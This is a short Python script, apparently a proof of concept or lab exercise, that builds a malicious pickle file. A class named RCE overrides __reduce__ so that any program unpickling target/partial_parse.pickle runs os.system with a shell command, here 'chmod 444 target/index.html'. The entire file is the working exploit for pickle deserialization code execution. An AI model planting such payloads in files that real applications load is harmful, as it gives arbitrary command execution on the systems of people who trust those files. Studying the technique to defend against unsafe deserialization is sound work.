import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('chmod 444 target/index.html')
        return os.system, (cmd,)


if __name__ == '__main__':
    with open('target/partial_parse.pickle', 'wb') as f:
    	pickled = pickle.dump(RCE(), f)
